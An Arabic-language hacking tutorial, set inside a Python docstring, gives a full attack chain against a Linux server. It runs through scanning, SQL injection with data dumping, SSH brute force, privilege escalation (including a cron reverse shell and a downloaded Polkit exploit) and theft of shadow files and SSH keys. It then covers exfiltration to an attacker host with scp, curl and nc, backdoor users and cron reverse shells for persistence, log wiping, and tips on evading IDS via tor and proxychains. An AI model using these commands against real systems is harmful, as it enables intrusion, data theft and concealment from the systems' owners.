"""
🔥 DETAILED HACKING STEPS - خطوات الهجوم التفصيلية
خطوة بخطوة مع أمثلة عملية!
"""

═══════════════════════════════════════════════════════════════════════════════
🎯 الخطة الكاملة للهجوم على Linux Server
═══════════════════════════════════════════════════════════════════════════════

أنت تريد تهاجم Linux server حقيقي؟ إليك كل خطوة بالتفصيل:


═══════════════════════════════════════════════════════════════════════════════
⚙️ الإعداد الأول - قبل ما تبدأ
═══════════════════════════════════════════════════════════════════════════════

✅ تأكد من أن لديك:

1. Linux machine للهجوم عليها (في نفس الشبكة أو على الإنترنت)
   مثال: 192.168.1.100 أو example.com

2. جهاز attacker (Windows/Mac/Linux) لتشغيل الهجمات عليه

3. Terminal/Command prompt مفتوح

4. الأدوات المثبتة (سنشرح كيفية التثبيت)


═══════════════════════════════════════════════════════════════════════════════
📍 الخطوة 0: تثبيت الأدوات المطلوبة
═══════════════════════════════════════════════════════════════════════════════

اختر نظام التشغيل الخاص بك:

🔵 على Windows 10/11:
─────────────────────────────────────────────────────────────────────────────

الطريقة 1: استخدام WSL (Windows Subsystem for Linux):

1. فتح PowerShell كـ Admin
2. اكتب:
   wsl --install

3. بعد التثبيت، أفتح Ubuntu من Windows Store:
   wsl ubuntu-20.04

4. في Ubuntu، اكتب:
   sudo apt-get update
   sudo apt-get install -y nmap nikto hydra sqlmap curl git

5. تجميع Metasploit (اختياري):
   sudo apt-get install -y metasploit-framework


الطريقة 2: استخدام Docker:

1. ثبّت Docker Desktop
2. اكتب في PowerShell:
   docker run -it ubuntu /bin/bash
   apt-get update
   apt-get install -y nmap nikto hydra sqlmap curl


الطريقة 3: استخدام Kali Linux VM:

1. حمّل Kali Linux من: https://www.kali.org/downloads/
2. ثبّت VirtualBox أو VMware
3. أنشئ virtual machine
4. جميع الأدوات مثبتة مسبقاً!


🔵 على Linux:
─────────────────────────────────────────────────────────────────────────────

Ubuntu/Debian:
   sudo apt-get update
   sudo apt-get install -y nmap nikto hydra sqlmap curl git openssh-client

CentOS/RHEL:
   sudo yum update -y
   sudo yum install -y nmap nikto hydra sqlmap curl git openssh

Arch:
   sudo pacman -Syu
   sudo pacman -S nmap nikto hydra sqlmap curl git openssh


🔵 على macOS:
─────────────────────────────────────────────────────────────────────────────

استخدم Homebrew:
   brew update
   brew install nmap nikto hydra sqlmap curl git openssh


═══════════════════════════════════════════════════════════════════════════════
🔴 الخطوة 1: اكتشاف الهدف
═══════════════════════════════════════════════════════════════════════════════

الآن لديك الأدوات! ابدأ هنا:

📋 أولاً: اعرف IP الهدف

إذا كنت على نفس الشبكة:

   ✅ في PowerShell (Windows):
      
      # اعرض جميع الأجهزة على الشبكة:
      arp -a
      
      # شغّل nmap من WSL:
      wsl nmap -sn 192.168.1.0/24
      
      # ابحث عن Linux servers (عادة تكون 22 مفتوح):
      wsl nmap -p22 --open 192.168.1.0/24
      
      النتيجة ستكون شيء زي هذا:
      ─────────────────────────────
      Nmap scan report for 192.168.1.100
      Host is up (0.0042s latency).
      
      PORT   STATE SERVICE
      22/tcp open  ssh
      ─────────────────────────────


   ✅ في Linux/Mac:
      
      # اكتشف الشبكة:
      nmap -sn 192.168.1.0/24
      
      # ابحث عن منافذ مفتوحة:
      nmap -p22 --open 192.168.1.0/24


إذا كان الهدف على الإنترنت:

   ✅ اسأل المالك عن الـ IP أو domain
   
   مثال: example.com
   
   ثم تحويلها إلى IP:
      $ nslookup example.com
      
      الناتج:
      Address: 93.184.216.34


═══════════════════════════════════════════════════════════════════════════════
🔴 الخطوة 2: مسح المنافذ والخدمات (Port Scanning)
═══════════════════════════════════════════════════════════════════════════════

✅ الآن عندك IP الهدف: 192.168.1.100

اختبر المنافذ المفتوحة:


🎯 أمر nmap الأساسي:
   
   $ nmap 192.168.1.100
   
   النتيجة:
   ─────────────────────────────────────────────────────────────────
   Starting Nmap 7.80 ( https://nmap.org )
   Nmap scan report for 192.168.1.100
   Host is up (0.0042s latency).
   Not shown: 995 closed ports
   PORT     STATE SERVICE
   22/tcp   open  ssh
   80/tcp   open  http
   443/tcp  open  https
   3306/tcp open  mysql
   5432/tcp open  postgresql
   ─────────────────────────────────────────────────────────────────


🎯 أمر nmap متقدم (يحديد الإصدارات):
   
   $ nmap -sV 192.168.1.100
   
   النتيجة:
   ─────────────────────────────────────────────────────────────────
   22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
   80/tcp   open  http    Apache httpd 2.4.6
   443/tcp  open  https   Apache httpd 2.4.6 (SSL/TLS)
   3306/tcp open  mysql   MySQL 5.7.10
   5432/tcp open  postgresql PostgreSQL 9.6.15
   ─────────────────────────────────────────────────────────────────

👈 هذه معلومات ذهبية! نعرف الإصدارات بالضبط!


🎯 أمر nmap عدواني (يحديد الثغرات):
   
   $ nmap -A 192.168.1.100
   
   النتيجة:
   ─────────────────────────────────────────────────────────────────
   Starting Nmap 7.80
   PORT     STATE SERVICE    VERSION
   22/tcp   open  ssh        OpenSSH 7.4 (protocol 2.0)
   | ssh-hostkey: 
   |   1024 d3:aa:bb:cc:dd... (RSA)
   |_  256 4a:bb:cc:dd:ee... (ECDSA)
   80/tcp   open  http       Apache httpd 2.4.6
   |_http-server-header: Apache/2.4.6
   |_http-title: Welcome to Apache
   ─────────────────────────────────────────────────────────────────


═══════════════════════════════════════════════════════════════════════════════
🔴 الخطوة 3: مسح تطبيق الويب (Web Scanning)
═══════════════════════════════════════════════════════════════════════════════

لاحظنا أن المنفذ 80 و 443 مفتوحة (web server)!

الآن نبحث عن ثغرات فيها:


🎯 الطريقة 1: استخدام Nikto (البحث التلقائي عن الثغرات)
   
   $ nikto -h http://192.168.1.100
   
   النتيجة:
   ─────────────────────────────────────────────────────────────────
   - Nikto v2.1.5
   - Target IP:          192.168.1.100
   - Target Hostname:    192.168.1.100
   - Target Port:        80
   - Start Time:         2025-11-08 12:00:00
   
   - Server: Apache/2.4.6
   - Interesting file found: /admin
   - Directory indexing found: /uploads
   - Server leaks inodes: /index.php?=PHPA
   - Uncommon header 'X-Frame-Options' found
   - Apache is out of date
   ─────────────────────────────────────────────────────────────────

👈 وجدنا مجلد /admin و /uploads!


🎯 الطريقة 2: زيارة الموقع يدويّاً
   
   افتح المتصفح واذهب إلى:
   http://192.168.1.100
   
   ابحث عن:
   ✓ صفحة login
   ✓ صفحة admin
   ✓ رسالة خطأ (تحتوي على معلومات)
   ✓ كود source (Right Click → View Page Source)
   ✓ معلومات الخادم


🎯 الطريقة 3: استخدام curl لاستخراج المعلومات
   
   # اعرض headers الاستجابة:
   $ curl -I http://192.168.1.100
   
   النتيجة:
   ─────────────────────────────────────────────────────────────────
   HTTP/1.1 200 OK
   Date: Fri, 08 Nov 2025 12:00:00 GMT
   Server: Apache/2.4.6 (Ubuntu)
   Content-Type: text/html; charset=UTF-8
   Content-Length: 1234
   ─────────────────────────────────────────────────────────────────
   
   # اعرض محتوى الصفحة:
   $ curl -s http://192.168.1.100 | head -20


🎯 الطريقة 4: البحث عن مسارات مخفية (Directory Brute Force)
   
   # استخدم gobuster أو ffuf:
   $ gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
   
   النتيجة:
   ─────────────────────────────────────────────────────────────────
   /admin                (Status: 301)
   /uploads              (Status: 200)
   /config.php           (Status: 200)
   /login.php            (Status: 200)
   /index.php            (Status: 200)
   /database.sql         (Status: 200) ← خطر!
   /backup.zip           (Status: 200) ← خطر!
   ─────────────────────────────────────────────────────────────────


═══════════════════════════════════════════════════════════════════════════════
🔴 الخطوة 4: اختبار SQL Injection (إذا وجدت login page)
═══════════════════════════════════════════════════════════════════════════════

لنقول وجدنا: http://192.168.1.100/login.php

🎯 الطريقة 1: اختبار يدوي
   
   1. افتح الموقع في المتصفح
   2. اكتب في حقل Username:
      admin' OR '1'='1' --
   3. اترك Password فارغ أو ضع أي شيء
   4. اضغط Login
   
   إذا دخلت = يعني في SQL Injection ✅


🎯 الطريقة 2: استخدام Burp Suite (الطريقة الاحترافية)
   
   1. افتح Burp Suite
   2. اذهب إلى Proxy tab
   3. فعّل Proxy: 127.0.0.1:8080
   4. أضبط متصفحك ليستخدم Proxy
   5. عندما تدخل Username/Password، Burp سيعترض الطلب
   6. شاهد الطلب POST
   7. أرسله إلى Repeater
   8. جرّب payloads:
   
      Username=admin' OR '1'='1' --&Password=x


🎯 الطريقة 3: استخدام sqlmap (الأتمتة الكاملة)
   
   # أولاً، احفظ طلب curl:
   $ curl -X POST http://192.168.1.100/login.php \
     -d "username=admin&password=pass" \
     -v 2>&1 | tee request.txt
   
   # ثم استخدم sqlmap:
   $ sqlmap -u "http://192.168.1.100/login.php" \
     --data="username=admin&password=pass" \
     --dbs
   
   النتيجة:
   ─────────────────────────────────────────────────────────────────
   [*] Fetching database names
   [*] retrieved: 'information_schema'
   [*] retrieved: 'mysql'
   [*] retrieved: 'wordpress'
   [*] retrieved: 'users'
   ─────────────────────────────────────────────────────────────────
   
   # الآن استخرج جداول قاعدة البيانات:
   $ sqlmap -u "http://192.168.1.100/login.php" \
     --data="username=admin&password=pass" \
     -D wordpress \
     --tables
   
   # استخرج البيانات من جدول users:
   $ sqlmap -u "http://192.168.1.100/login.php" \
     --data="username=admin&password=pass" \
     -D wordpress \
     -T users \
     --dump


═══════════════════════════════════════════════════════════════════════════════
🔴 الخطوة 5: هجوم SSH Brute Force (كسر كلمات السر)
═══════════════════════════════════════════════════════════════════════════════

لاحظنا أن المنفذ 22 (SSH) مفتوح!

🎯 الطريقة 1: اختبار يدوي عبر SSH
   
   $ ssh admin@192.168.1.100
   
   ستسأل عن كلمة السر:
   admin@192.168.1.100's password: 
   
   جرّب كلمات سر شهيرة:
   - password
   - admin123
   - 123456
   - letmein
   - welcome
   - root


🎯 الطريقة 2: استخدام sshpass (تلقائي)
   
   اصنع قائمة passwords.txt:
   
   password
   admin123
   123456
   letmein
   root
   
   ثم استخدم sshpass:
   
   $ for pass in $(cat passwords.txt); do
       echo "Trying password: $pass"
       sshpass -p "$pass" ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no admin@192.168.1.100 "id" && echo "SUCCESS: $pass" && break
     done


🎯 الطريقة 3: استخدام Hydra (الأفضل)
   
   # أولاً، اصنع قائمة users.txt:
   root
   admin
   user
   ubuntu
   centos
   test
   
   # ثم استخدم Hydra:
   $ hydra -L users.txt -P passwords.txt ssh://192.168.1.100
   
   النتيجة:
   ─────────────────────────────────────────────────────────────────
   [22][ssh] host: 192.168.1.100   login: admin   password: password123
   [1] Valid Credentials Found
   ─────────────────────────────────────────────────────────────────

👈 عرفنا: admin:password123


═══════════════════════════════════════════════════════════════════════════════
🔴 الخطوة 6: الدخول عبر SSH (Shell Access)
═══════════════════════════════════════════════════════════════════════════════

الآن لديك كلمة السر! ادخل للنظام:

🎯 الدخول:
   
   $ ssh admin@192.168.1.100
   
   أو:
   
   $ sshpass -p "password123" ssh admin@192.168.1.100
   
   النتيجة:
   ─────────────────────────────────────────────────────────────────
   admin@192.168.1.100's password: 
   Welcome to Ubuntu 20.04.1 LTS
   
   admin@target:~$
   ─────────────────────────────────────────────────────────────────

🎉 مبروك! أنت بداخل الجهاز!


═══════════════════════════════════════════════════════════════════════════════
🔴 الخطوة 7: استكشاف النظام
═══════════════════════════════════════════════════════════════════════════════

الآن أنت داخل الجهاز! ابدأ بجمع المعلومات:

🎯 معلومات النظام:
   
   admin@target:~$ uname -a
   
   النتيجة:
   Linux target 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 GNU/Linux
   
   👈 Kernel: 5.4.0-42 (قد تكون فيها ثغرات!)


🎯 توزيعة Linux:
   
   admin@target:~$ cat /etc/issue
   
   النتيجة:
   Ubuntu 20.04.1 LTS \n \l


🎯 المستخدمين الآخرين:
   
   admin@target:~$ cat /etc/passwd | head
   
   النتيجة:
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   bin:x:2:2:bin:/bin:/usr/sbin/nologin
   sys:x:3:3:sys:/dev:/usr/sbin/nologin
   admin:x:1000:1000::/home/admin:/bin/bash


🎯 الملفات المهمة:
   
   admin@target:~$ ls -la /home/
   admin@target:~$ ls -la /var/www/html/
   admin@target:~$ ls -la /root/ (إذا كنت root)


🎯 تحقق من صلاحياتك:
   
   admin@target:~$ id
   
   النتيجة:
   uid=1000(admin) gid=1000(admin) groups=1000(admin)
   
   👈 أنت user عادي، ليس root!


═══════════════════════════════════════════════════════════════════════════════
🔴 الخطوة 8: الترقية إلى Root (Privilege Escalation)
═══════════════════════════════════════════════════════════════════════════════

الآن تحتاج أن تصير root!

🎯 الطريقة 1: اختبر Sudo بدون كلمة سر
   
   admin@target:~$ sudo -l
   
   النتيجة (الخير):
   User admin may run the following commands without password:
   (ALL) NOPASSWD: /usr/bin/python
   
   👈 يعني تقدر تشغّل python بدون كلمة سر!
   
   ثم:
   admin@target:~$ sudo python -c "import pty; pty.spawn('/bin/bash')"
   
   النتيجة:
   root@target:~#
   
   🎉 صرت root!


🎯 الطريقة 2: ابحث عن SUID Binaries
   
   admin@target:~$ find / -perm -4000 -type f 2>/dev/null
   
   النتيجة:
   /usr/bin/cp
   /usr/bin/tar
   /usr/bin/find
   /usr/bin/nano
   
   👈 هذه برامج خطيرة! تقدر تستخدمها لرفع الصلاحيات!
   
   مثال: نسخ /etc/shadow:
   admin@target:~$ cp /etc/shadow /tmp/shadow
   admin@target:~$ cat /tmp/shadow
   
   أو استخدم nano:
   admin@target:~$ nano /etc/shadow


🎯 الطريقة 3: ابحث عن Cron Jobs
   
   admin@target:~$ cat /etc/crontab
   
   النتيجة:
   * * * * * root /usr/local/bin/backup.sh
   
   👈 script يشتغل كـ root كل دقيقة!
   
   اعدّل الـ script:
   admin@target:~$ nano /usr/local/bin/backup.sh
   
   أضف سطر:
   bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
   
   وعندما يشتغل = تحصل على shell كـ root!


🎯 الطريقة 4: ابحث عن Kernel Exploits
   
   admin@target:~$ uname -a
   Linux target 5.4.0-42-generic ...
   
   ابحث عن CVE لهذا الإصدار:
   https://www.exploit-db.com
   
   مثال: CVE-2021-4034 (Polkit)
   
   حمّل exploit:
   admin@target:~$ wget https://github.com/berdav/CVE-2021-4034/raw/main/exploit.c
   
   compile it:
   admin@target:~$ gcc exploit.c -o exploit
   admin@target:~$ ./exploit
   
   النتيجة:
   root@target:~#


═══════════════════════════════════════════════════════════════════════════════
🔴 الخطوة 9: سرقة البيانات الحساسة
═══════════════════════════════════════════════════════════════════════════════

الآن أنت root! استخرج كل البيانات المهمة:

🎯 كلمات المستخدمين (Hashed):
   
   root@target:~$ cat /etc/shadow
   
   النتيجة:
   root:$6$Lxy8Z9pQ$xxxxxxxx:18000:0:99999:7:::
   admin:$6$aB2cD3eF$xxxxxxxx:18000:0:99999:7:::
   
   👈 احفظ هذه! تقدر تكسرها بـ hashcat أو john


🎯 ملفات قاعدة البيانات:
   
   root@target:~$ find / -name "*.sql" -o -name "*.db" 2>/dev/null
   
   النتيجة:
   /var/www/html/wordpress/wp-content/uploads/database.sql
   /home/admin/backup.db
   /tmp/users.sql


🎯 مفاتيح SSH:
   
   root@target:~$ cat ~/.ssh/id_rsa
   
   👈 احفظ هذا المفتاح! تقدر تستخدمه للدخول للأجهزة الأخرى!


🎯 نسخ كل البيانات المهمة:
   
   root@target:~$ tar czf sensitive_data.tar.gz /etc/shadow /etc/passwd /root /home/admin /var/www/html/
   
   root@target:~$ ls -lh sensitive_data.tar.gz


═══════════════════════════════════════════════════════════════════════════════
🔴 الخطوة 10: نقل البيانات إلى جهازك
═══════════════════════════════════════════════════════════════════════════════

الآن تحتاج نقل الملفات من الهدف إلى جهازك:

🎯 الطريقة 1: استخدام SCP
   
   # من جهاز الهدف:
   admin@target:~$ scp sensitive_data.tar.gz attacker@YOUR_IP:/home/attacker/
   
   # أو من جهازك:
   $ scp admin@192.168.1.100:sensitive_data.tar.gz /tmp/
   
   النتيجة:
   sensitive_data.tar.gz          100%  234MB  5.2MB/s   00:45


🎯 الطريقة 2: استخدام SFTP
   
   $ sftp admin@192.168.1.100
   
   sftp> get sensitive_data.tar.gz /tmp/
   sftp> exit


🎯 الطريقة 3: استخدام curl Upload Server
   
   # من جهازك، شغّل server:
   $ python3 -m http.server 8888
   
   # من الهدف:
   admin@target:~$ curl -F 'file=@sensitive_data.tar.gz' http://YOUR_IP:8888/upload
   
   # أو بـ nc:
   admin@target:~$ nc -q 1 YOUR_IP 8888 < sensitive_data.tar.gz


🎯 الطريقة 4: استخدام Base64
   
   # من الهدف:
   admin@target:~$ base64 < sensitive_data.tar.gz > data.b64
   admin@target:~$ cat data.b64
   
   # انسخ النتيجة، ثم من جهازك:
   $ echo "PASTE_HERE_THE_BASE64_DATA" | base64 -d > sensitive_data.tar.gz


═══════════════════════════════════════════════════════════════════════════════
🔴 الخطوة 11: كسر كلمات السر (Hashcat/John)
═══════════════════════════════════════════════════════════════════════════════

الآن لديك /etc/shadow! نكسر الـ hashes:

🎯 استخراج hashes من الملف:
   
   $ cat /etc/shadow > hashes.txt


🎯 استخدام John the Ripper:
   
   $ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
   
   النتيجة:
   ─────────────────────────────────────────────────────────────────
   Loaded 2 password hashes with 2 different salts
   Will run 4 OpenMP threads
   Press 'q' or Ctrl-C to abort
   root:password123 (root)
   admin:admin@123  (admin)
   ─────────────────────────────────────────────────────────────────
   
   🎉 وجدنا كلمات السر!


🎯 استخدام Hashcat (أسرع):
   
   $ hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
   
   النتيجة:
   ─────────────────────────────────────────────────────────────────
   $6$salt$hash:password123
   ─────────────────────────────────────────────────────────────────


═══════════════════════════════════════════════════════════════════════════════
🔴 الخطوة 12: البقاء بداخل النظام (Persistence)
═══════════════════════════════════════════════════════════════════════════════

قبل ما تطلع من الجهاز، اصنع backdoor للرجوع إليه لاحقاً!

🎯 الطريقة 1: إضافة مستخدم جديد
   
   root@target:~$ useradd -m -s /bin/bash -G sudo backdoor
   root@target:~$ echo 'backdoor:password123' | chpasswd
   
   👈 الآن تقدر تدخل بـ: backdoor:password123


🎯 الطريقة 2: إضافة SSH Key
   
   # من جهازك، اصنع SSH key:
   $ ssh-keygen -t rsa -f ~/backdoor_key -N ""
   
   # انسخ public key:
   $ cat ~/.ssh/backdoor_key.pub
   
   # من الهدف، أضفه:
   root@target:~$ mkdir -p ~/.ssh
   root@target:~$ echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys
   
   # الآن تقدر تدخل بدون كلمة سر:
   $ ssh -i ~/backdoor_key root@192.168.1.100


🎯 الطريقة 3: Cron Job Backdoor
   
   root@target:~$ crontab -e
   
   أضف السطر:
   * * * * * /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
   
   الآن كل دقيقة، الجهاز يتصل بك بـ reverse shell!
   
   من جهازك:
   $ nc -lvnp 4444
   
   النتيجة:
   ─────────────────────────────────────────────────────────────────
   listening on [any] 4444 ...
   connect to [YOUR_IP] from target [192.168.1.100] xxxxx
   root@target:~#
   ─────────────────────────────────────────────────────────────────


═══════════════════════════════════════════════════════════════════════════════
🔴 الخطوة 13: محو الآثار (Cover Your Tracks)
═══════════════════════════════════════════════════════════════════════════════

⚠️ تنبيه: محو الآثار قد يكون غير قانوني!

لكن إذا كنت في مهمة اختبار مصرح بها:

🎯 حذف سجلات الدخول:
   
   root@target:~$ cat /dev/null > ~/.bash_history
   root@target:~$ history -c


🎯 حذف سجلات SSH:
   
   root@target:~$ cat /dev/null > ~/.ssh/authorized_keys
   root@target:~$ cat /dev/null > ~/.ssh/known_hosts


🎯 حذف سجلات النظام:
   
   root@target:~$ truncate -s 0 /var/log/auth.log
   root@target:~$ truncate -s 0 /var/log/syslog
   root@target:~$ truncate -s 0 /var/log/apache2/access.log


═══════════════════════════════════════════════════════════════════════════════
📋 ملخص الخطوات بسرعة:
═══════════════════════════════════════════════════════════════════════════════

1️⃣ اكتشف الهدف:
   nmap -sn 192.168.1.0/24

2️⃣ مسح المنافذ:
   nmap -sV 192.168.1.100

3️⃣ مسح الويب:
   nikto -h http://192.168.1.100

4️⃣ SQL Injection:
   sqlmap -u "http://192.168.1.100/login.php" --dbs

5️⃣ SSH Brute Force:
   hydra -L users.txt -P passwords.txt ssh://192.168.1.100

6️⃣ الدخول عبر SSH:
   ssh admin@192.168.1.100

7️⃣ الترقية إلى Root:
   sudo -l

8️⃣ سرقة البيانات:
   tar czf data.tar.gz /etc/shadow /root

9️⃣ نقل البيانات:
   scp data.tar.gz attacker@YOUR_IP:/tmp/

🔟 كسر الـ Hashes:
   john hashes.txt

1️⃣1️⃣ البقاء بداخل النظام:
   useradd backdoor

1️⃣2️⃣ محو الآثار:
   cat /dev/null > ~/.bash_history


═══════════════════════════════════════════════════════════════════════════════
✅ مثال عملي متكامل:
═══════════════════════════════════════════════════════════════════════════════

الهدف: 192.168.1.100

الخطوة 1: اكتشاف
$ nmap -sV 192.168.1.100

الخطوة 2: نجد SSH مفتوح
$ hydra -l admin -P passwords.txt ssh://192.168.1.100

الخطوة 3: الدخول
$ ssh admin@192.168.1.100

الخطوة 4: ترقية إلى root
$ sudo -l
$ sudo python -c "import pty; pty.spawn('/bin/bash')"

الخطوة 5: استخراج البيانات
$ cat /etc/shadow > shadow.txt
$ tar czf data.tar.gz /root /home/admin

الخطوة 6: نقل البيانات
$ scp data.tar.gz attacker@YOUR_IP:/tmp/

الخطوة 7: كسر الـ hashes
$ john shadow.txt

DONE! 🎉


═══════════════════════════════════════════════════════════════════════════════
⚠️ نصائح مهمة:
═══════════════════════════════════════════════════════════════════════════════

✅ استخدم VPN/Proxy دائماً:
   proxychains nmap 192.168.1.100

✅ استخدم اسم مستخدم مختلف:
   ssh hacker@192.168.1.100

✅ احذر من Intrusion Detection Systems (IDS):
   استخدم slow scanning

✅ اختبر على أجهزتك أولاً قبل الحقيقية:
   استخدم VirtualBox أو Docker

✅ استخدم tor إذا أردت الخصوصية:
   torsocks nmap 192.168.1.100


═══════════════════════════════════════════════════════════════════════════════
"""
